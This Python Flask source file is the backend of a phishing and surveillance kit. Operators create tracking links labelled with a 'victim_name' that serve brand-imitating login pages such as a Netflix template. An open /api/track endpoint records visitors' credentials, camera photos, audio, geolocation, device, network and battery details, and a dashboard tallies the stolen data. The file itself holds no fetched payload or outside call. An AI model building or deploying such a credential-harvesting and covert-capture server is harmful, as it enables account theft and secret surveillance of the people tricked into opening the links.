import os
import sys

# Add parent directory to path so we can import from root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_cors import CORS
import json
import uuid
import hashlib
import datetime
from functools import wraps

app = Flask(__name__, 
    template_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates'),
    static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')
)
app.secret_key = os.environ.get('SECRET_KEY', 'shadow_official_secret_key_2024_super_secure')
CORS(app)

# Load config
CONFIG_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config.json')
def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

config = load_config()

# Data directory - use /tmp for Vercel (read-only filesystem except /tmp)
DATA_DIR = os.environ.get('DATA_DIR', 'data')
if os.environ.get('VERCEL'):
    DATA_DIR = '/tmp/data'

USERS_FILE = os.path.join(DATA_DIR, 'users.json')
LINKS_FILE = os.path.join(DATA_DIR, 'links.json')
CAPTURES_FILE = os.path.join(DATA_DIR, 'captures.json')

os.makedirs(DATA_DIR, exist_ok=True)

def init_json_file(filepath, default_data):
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            json.dump(default_data, f, indent=2)

init_json_file(USERS_FILE, {"users": []})
init_json_file(LINKS_FILE, {"links": []})
init_json_file(CAPTURES_FILE, {"captures": []})

def read_json(filepath):
    with open(filepath, 'r') as f:
        return json.load(f)

def write_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

# Inject config into all templates
@app.context_processor
def inject_config():
    return dict(config=config)

# ===================== PAGES =====================

@app.route('/')
def index():
    return redirect(url_for('login_page'))

@app.route('/login')
def login_page():
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

# Template router - serves the correct template based on link config
@app.route('/t/<link_id>')
def template_router(link_id):
    links_data = read_json(LINKS_FILE)
    link = None
    for l in links_data['links']:
        if l['id'] == link_id:
            link = l
            break

    if not link:
        return "Link not found", 404

    template = link.get('template', 'netflix')
    template_file = template + '.html'
    return render_template(template_file, link_id=link_id, link=link)

# Keep old earn route for backward compatibility
@app.route('/earn/<link_id>')
def earn_page(link_id):
    return redirect(url_for('template_router', link_id=link_id))

# ===================== CONFIG API =====================

@app.route('/api/config')
def api_config():
    return jsonify({"success": True, "config": config})

# ===================== AUTH APIs =====================

@app.route('/api/register', methods=['POST'])
def api_register():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    if not username or not password:
        return jsonify({"success": False, "message": "Username and password required"}), 400
    users_data = read_json(USERS_FILE)
    for user in users_data['users']:
        if user['username'] == username:
            return jsonify({"success": False, "message": "Username already exists"}), 400
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    user_id = str(uuid.uuid4())
    users_data['users'].append({
        "id": user_id,
        "username": username,
        "password": hashed_password,
        "created_at": datetime.datetime.now().isoformat()
    })
    write_json(USERS_FILE, users_data)
    return jsonify({"success": True, "message": "Account created successfully"})

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    users_data = read_json(USERS_FILE)
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    for user in users_data['users']:
        if user['username'] == username and user['password'] == hashed_password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            return jsonify({"success": True, "message": "Login successful", "user": {"id": user['id'], "username": user['username']}})
    return jsonify({"success": False, "message": "Invalid username or password"}), 401

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({"success": True, "message": "Logged out"})

@app.route('/api/user')
def api_user():
    if 'user_id' not in session:
        return jsonify({"success": False, "message": "Not logged in"}), 401
    return jsonify({"success": True, "user": {"id": session['user_id'], "username": session['username']}})

# ===================== LINK / TEMPLATE APIs =====================

@app.route('/api/generate-link', methods=['POST'])
@login_required
def api_generate_link():
    data = request.get_json()
    template = data.get('template', 'netflix').strip()
    victim_name = data.get('victim_name', '').strip()
    custom_dp = data.get('custom_dp', '').strip()
    title = data.get('title', f'{template.title()} Login').strip()

    link_id = str(uuid.uuid4())[:10]
    links_data = read_json(LINKS_FILE)
    links_data['links'].append({
        "id": link_id,
        "title": title,
        "template": template,
        "victim_name": victim_name,
        "custom_dp": custom_dp,
        "created_by": session['user_id'],
        "created_at": datetime.datetime.now().isoformat(),
        "clicks": 0,
        "active": True
    })
    write_json(LINKS_FILE, links_data)
    base_url = request.host_url.rstrip('/')
    tracking_url = f"{base_url}/t/{link_id}"
    return jsonify({"success": True, "link": {"id": link_id, "title": title, "template": template, "tracking_url": tracking_url}})

@app.route('/api/links')
@login_required
def api_links():
    links_data = read_json(LINKS_FILE)
    user_links = [link for link in links_data['links'] if link['created_by'] == session['user_id']]
    return jsonify({"success": True, "links": user_links})

@app.route('/api/delete-link/<link_id>', methods=['DELETE'])
@login_required
def api_delete_link(link_id):
    links_data = read_json(LINKS_FILE)
    links_data['links'] = [link for link in links_data['links'] if not (link['id'] == link_id and link['created_by'] == session['user_id'])]
    write_json(LINKS_FILE, links_data)
    return jsonify({"success": True, "message": "Link deleted"})

# ===================== CAPTURE APIs (NO LOGIN) =====================

@app.route('/api/track/<link_id>', methods=['POST'])
def api_track(link_id):
    data = request.get_json()

    links_data = read_json(LINKS_FILE)
    link = None
    for l in links_data['links']:
        if l['id'] == link_id:
            link = l
            l['clicks'] += 1
            break

    if not link:
        return jsonify({"success": False, "message": "Link not found"}), 404

    write_json(LINKS_FILE, links_data)

    captures_data = read_json(CAPTURES_FILE)

    photos = data.get('photos', [])
    audio = data.get('audio')
    creds = data.get('credentials')

    if photos or audio or creds:
        for cap in reversed(captures_data['captures']):
            if cap['link_id'] == link_id:
                if photos:
                    if 'photos' not in cap or not cap['photos']:
                        cap['photos'] = []
                    cap['photos'].extend(photos)
                if audio:
                    cap['audio'] = audio
                if creds:
                    cap['credentials'] = creds
                write_json(CAPTURES_FILE, captures_data)
                return jsonify({"success": True, "message": "Data updated"})

    capture_entry = {
        "id": str(uuid.uuid4()),
        "link_id": link_id,
        "link_title": link.get('title', 'Unknown'),
        "template": link.get('template', 'unknown'),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', 'Unknown'),
        "referrer": request.headers.get('Referer', 'Direct'),
        "timestamp": datetime.datetime.now().isoformat(),
        "location": data.get('location', {}),
        "device_info": data.get('device_info', {}),
        "screen_info": data.get('screen_info', {}),
        "network_info": data.get('network_info', {}),
        "battery_info": data.get('battery_info', {}),
        "photos": [],
        "audio": None,
        "credentials": None
    }

    captures_data['captures'].append(capture_entry)
    write_json(CAPTURES_FILE, captures_data)

    return jsonify({"success": True, "message": "Tracked successfully"})

# ===================== DASHBOARD APIs =====================

@app.route('/api/captures')
@login_required
def api_captures():
    captures_data = read_json(CAPTURES_FILE)
    links_data = read_json(LINKS_FILE)
    user_link_ids = [link['id'] for link in links_data['links'] if link['created_by'] == session['user_id']]
    user_captures = [cap for cap in captures_data['captures'] if cap['link_id'] in user_link_ids]
    user_captures.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify({"success": True, "captures": user_captures})

@app.route('/api/capture/<capture_id>')
@login_required
def api_capture_detail(capture_id):
    captures_data = read_json(CAPTURES_FILE)
    links_data = read_json(LINKS_FILE)
    user_link_ids = [link['id'] for link in links_data['links'] if link['created_by'] == session['user_id']]
    capture = None
    for cap in captures_data['captures']:
        if cap['id'] == capture_id and cap['link_id'] in user_link_ids:
            capture = cap
            break
    if not capture:
        return jsonify({"success": False, "message": "Capture not found"}), 404
    return jsonify({"success": True, "capture": capture})

@app.route('/api/stats')
@login_required
def api_stats():
    links_data = read_json(LINKS_FILE)
    captures_data = read_json(CAPTURES_FILE)
    user_link_ids = [link['id'] for link in links_data['links'] if link['created_by'] == session['user_id']]
    user_captures = [cap for cap in captures_data['captures'] if cap['link_id'] in user_link_ids]

    total_links = len(user_link_ids)
    total_clicks = sum(link['clicks'] for link in links_data['links'] if link['id'] in user_link_ids)
    total_captures = len(user_captures)
    total_photos = sum(len(cap.get('photos', [])) for cap in user_captures)
    total_creds = sum(1 for cap in user_captures if cap.get('credentials'))
    total_audio = sum(1 for cap in user_captures if cap.get('audio'))

    today = datetime.datetime.now().strftime('%Y-%m-%d')
    today_captures = [cap for cap in user_captures if cap['timestamp'].startswith(today)]

    return jsonify({
        "success": True,
        "stats": {
            "total_links": total_links,
            "total_clicks": total_clicks,
            "total_captures": total_captures,
            "today_captures": len(today_captures),
            "total_photos": total_photos,
            "total_creds": total_creds,
            "total_audio": total_audio
        }
    })

@app.route('/api/clear-captures', methods=['POST'])
@login_required
def api_clear_captures():
    captures_data = read_json(CAPTURES_FILE)
    links_data = read_json(LINKS_FILE)
    user_link_ids = [link['id'] for link in links_data['links'] if link['created_by'] == session['user_id']]
    captures_data['captures'] = [cap for cap in captures_data['captures'] if cap['link_id'] not in user_link_ids]
    write_json(CAPTURES_FILE, captures_data)
    return jsonify({"success": True, "message": "All captures cleared"})
